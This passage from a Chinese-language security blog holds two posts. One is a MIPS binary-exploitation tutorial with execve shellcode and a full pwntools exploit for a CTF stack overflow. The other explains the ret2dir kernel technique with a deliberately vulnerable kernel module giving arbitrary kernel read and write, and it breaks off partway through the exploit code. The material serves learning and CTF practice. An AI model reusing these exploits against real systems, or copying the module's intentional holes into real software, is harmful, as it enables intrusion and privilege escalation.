<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp</span><br></pre></td></tr></table></figure></div>
<h5 id="mips栈帧结构">5.MIPS栈帧结构</h5>
<p>典型的MIPS栈帧结构包括以下部分：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------+ &lt;-- 栈顶（高地址）</span><br><span class="line">|  返回地址（$ra）          | 保存调用者的返回地址</span><br><span class="line">+-------------------------+</span><br><span class="line">|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）</span><br><span class="line">+-------------------------+</span><br><span class="line">|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中</span><br><span class="line">+-------------------------+</span><br><span class="line">|  局部变量                | 局部变量、临时数据等</span><br><span class="line">+-------------------------+</span><br><span class="line">|  ...                    | 其他数据</span><br><span class="line">+-------------------------+</span><br><span class="line">|                         |</span><br><span class="line">|  栈空闲区                |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+ &lt;-- 栈底（低地址）</span><br></pre></td></tr></table></figure></div>
<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过<span
class="math inline">\(sp或\)</span>fp进行的。</p>
<p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
<p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
<ul>
<li><strong>叶子函数</strong>：
<ul>
<li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
<li>特点
<ul>
<li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
<li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
<li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
</ul></li>
</ul></li>
<li><strong>非叶子函数</strong>：
<ul>
<li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
<li>特点
<ul>
<li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
<li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
<li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
</ul></li>
</ul></li>
</ul>
<p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
<p>非叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Prologue</span><br><span class="line">addiu      sp,sp,-0x60				#栈上开辟空间</span><br><span class="line">sw         ra,local_4 (sp)			#存返回地址</span><br><span class="line">sw         s8,local_8 (sp)			#存该函数的栈底</span><br><span class="line">or         s8,sp,zero</span><br><span class="line">lui        gp,0x4a</span><br><span class="line">addiu      gp,gp,-0x5d50			#设置全局变量的指针</span><br><span class="line">sw         gp=&gt;_gp ,local_50 (sp)</span><br><span class="line">...</span><br><span class="line">#Epilogue</span><br><span class="line">lw         gp,local_50 (s8)</span><br><span class="line">or         v0,zero ,zero</span><br><span class="line">or         sp,s8,zero</span><br><span class="line">lw         ra,local_4 (sp)</span><br><span class="line">lw         s8,local_8 (sp)</span><br><span class="line">addiu      sp,sp,0x60</span><br><span class="line">jr         ra</span><br><span class="line">...</span><br><span class="line">#args offered</span><br><span class="line">li         a2,0x100						#size</span><br><span class="line">addiu      v0,s8,0x18</span><br><span class="line">or         a1,v0,zero					#buf</span><br><span class="line">or         a0,zero ,zero				#fd</span><br><span class="line">lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     </span><br><span class="line">or         t9,v0,zero</span><br><span class="line">bal        read                           </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>叶子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 执行函数B的任务</span><br><span class="line"># 不调用其他函数</span><br><span class="line"># 直接返回</span><br><span class="line">jr $ra</span><br></pre></td></tr></table></figure></div>
<h4 id="二mips环境搭建">二、mips环境搭建</h4>
<h5 id="安装qemu">1.安装qemu</h5>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu</span><br><span class="line"><span class="comment">#check if qemu existed</span></span><br><span class="line">qemu --version</span><br></pre></td></tr></table></figure></div>
<h5 id="安装gdb-multiarch">2.安装gdb-multiarch</h5>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br><span class="line"><span class="comment">#check if gdb-multiarch downloaded successfully</span></span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure></div>
<h5 id="安装ghidra">3.安装ghidra</h5>
<p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays
Decompiler插件</p>
<p>ghidra下载地址：https://github.com/NationalSecurityAgency/ghidra/releases</p>
<p>运行ghidra还需要JDK17及以上的环境</p>
<p>jdk下载地址：https://adoptium.net/zh-CN/</p>
<p><strong>启动 Ghidra</strong>：</p>
<ul>
<li><p>Windows</p>
<ul>
<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动
Ghidra。</li>
</ul></li>
<li><p>Linux/macOS</p>
<ul>
<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动
Ghidra：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ghidraRun</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
</ul>
<p><strong>初次运行设置</strong>：</p>
<ul>
<li>Ghidra
启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
<li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
</ul>
<h5 id="安装ida插件mipsrop">4.安装IDA插件mipsrop</h5>
<p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/ida.git ida-plugins</span><br></pre></td></tr></table></figure></div>
<p>mipsrop.py在
ida-plugins/plugins/mipsrop目录下，将其复制进IDA的plugins目录即可</p>
<p><strong>可能遇到的问题</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180630264.png"
                      class=""
                >
<p>在ida-plugins/plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
<h5 id="调试方法">5.调试方法</h5>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -g 6666 -L ./ ./program		<span class="comment">#开的端口是6666</span></span><br></pre></td></tr></table></figure></div>
<p>之后用gdb连接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch program</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:6666</span><br></pre></td></tr></table></figure></div>
<p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">programe = <span class="string">&#x27;your_program&#x27;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<h4 id="三mips的一些栈上漏洞利用">三、mips的一些栈上漏洞利用</h4>
<p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
<h5 id="栈溢出syscall">1.栈溢出+syscall</h5>
<p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
<p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control
jump中为jalr <span
class="math inline">\(fp的那个，因为\)</span>fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180732229.png"
                      class=""
                >
<p>然后既然能控制<span
class="math inline">\(a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到\)</span>a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180805478.png"
                      class=""
                >
<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab		</span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的一点是execve的第一个参数最好是/bin/sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180832554.png"
                      class=""
                >
<h4 id="四题目复现">四、题目复现</h4>
<h5 id="xyctf2024ez1.0">[xyctf2024]Ez1.0</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180859013.png"
                      class=""
                >
<p>非常简单粗暴的栈溢出，根据上述漏洞利用原理构造即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;mips&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;./mips&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;2333&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:2333</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x00427968</span></span><br><span class="line">gadget2 = <span class="number">0x0041FBF4</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab            </span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#shellcode = shellcraft.sh()</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>) + p32(gadget2) + p32(gadget1) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + asm(shellcode)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dir手法学习</title>
    <url>/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="ret2dir手法学习">ret2dir手法学习</h2>
<h4 id="原理">原理</h4>
<p>Ret2dir（Return-to-Direct Mapping）是一种 <strong>内核利用</strong>
技术，攻击者可以利用它 <strong>绕过 SMEP、SMAP、pxn
等用户空间与内核空间隔离的防护手段</strong>，最终实现
<strong>本地提权</strong>。</p>
<p>在 <strong>大多数 Linux 内核（基于 x86_64 架构）</strong>
中，<strong>物理地址（Physical Address）</strong> 的很大一部分会被
<strong>直接映射（direct mapping）</strong> 到
<strong>内核虚拟地址空间（Kernel Virtual Address Space）</strong>，即
<code>physmap</code>
区域。这意味着，<strong>用户态（Userland）可以通过某些手段影响物理页</strong>，而内核可能会使用这些页，从而形成攻击面。</p>
<p>比如我们如果在用户空间大量申请内存，这些内存会停留在 ram
中，也就是会占用实际的物理地址，这些物理内存是会被physmap映射的，那么我们就能够通过改用户空间的内存，在内核空间布置<strong>ROP链</strong>（高版本有不可执行，所以不能直接布置shellcode），然后在内核空间劫持程序执行流到对应的ROP链即可。</p>
<h4 id="case-study">Case Study</h4>
<p>这里先参照<a class="link" 
 href="https://www.anquanke.com/post/id/185408" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>自己搭个内核环境以及编写一个具有漏洞的模块进行学习。我们先写一个自己的内核模块，这里注册了一个叫做<strong>kpwn</strong>的misc设备以便之后用ioctl方式进行交互。这个模块提供了任意地址读、任意地址写、任意分配和回收内存的功能，以方便进行ret2dir的原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> addr;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="type">char</span> __user *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">read_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;         <span class="comment">//任意读取内核地址，可以内存搜索</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,addr,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">write_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;        <span class="comment">//任意改写内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(addr,args-&gt;buf,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">add_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//任意申请内核地址并返回给用户态</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;       </span><br><span class="line">    <span class="type">char</span> *buffer = kmalloc(args-&gt;size,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,(<span class="type">void</span> *)&amp;buffer,<span class="number">0x8</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">del_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//用户态任意释放内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    kfree((<span class="type">void</span> *)args-&gt;addr);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">kpwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line">    <span class="type">long</span> ret = -EINVAL;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(&amp;in,(<span class="type">void</span> *)arg,<span class="keyword">sizeof</span>(in)))&#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> READ_ANY:</span><br><span class="line">            ret = read_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WRITE_ANY:</span><br><span class="line">            ret = write_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEL_ANY:</span><br><span class="line">            ret = del_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ADD_ANY:</span><br><span class="line">            ret = add_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open =      <span class="literal">NULL</span>,</span><br><span class="line">    .release =   <span class="literal">NULL</span>,</span><br><span class="line">    .read =      <span class="literal">NULL</span>,</span><br><span class="line">    .write =     <span class="literal">NULL</span>,</span><br><span class="line">    .unlocked_ioctl = kpwn_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">misc</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name  = <span class="string">&quot;kpwn&quot;</span>,</span><br><span class="line">    .fops = &amp;fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kpwn_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    misc_register(&amp;misc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kpwn_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye hackern&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;misc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kpwn_init);</span><br><span class="line">module_exit(kpwn_exit);</span><br></pre></td></tr></table></figure></div>
<p>使用如下makefile进行编译内核模块，这里<strong>KERNELDR</strong>需要换成自己编译好的内核目录<strong>obj-m</strong>指定了目标输出文件：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">modules_prepare:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules_prepare</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.mod.c .tmp_versions *.mod *.order *.symvers</span><br></pre></td></tr></table></figure></div>
<p>我使用的启动脚本如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// run.sh</span></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -m <span class="number">150</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>
<p>文件系统中的init文件如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod myko.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里我在手动创建文件系统时遇到了一些问题，由于lib中的命令都是用静态编译的<strong>busybox</strong>链接实现，我一开始是直接利用busybox的list指令列出所有可用的函数，然后全部解析到lib目录中。但是这个list中并不包括
<strong>setuidgid</strong>
这个命令，导致不能成功进入内核，所以还需要手动导一下<strong>setgiduid</strong>，自动化脚本如下。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf busybox setuidgid</span><br></pre></td></tr></table></figure></div>
<p>之后我们可以写一个exp来验证ret2dir手法核心原理，我们的exp先准备好一些交互用的函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span 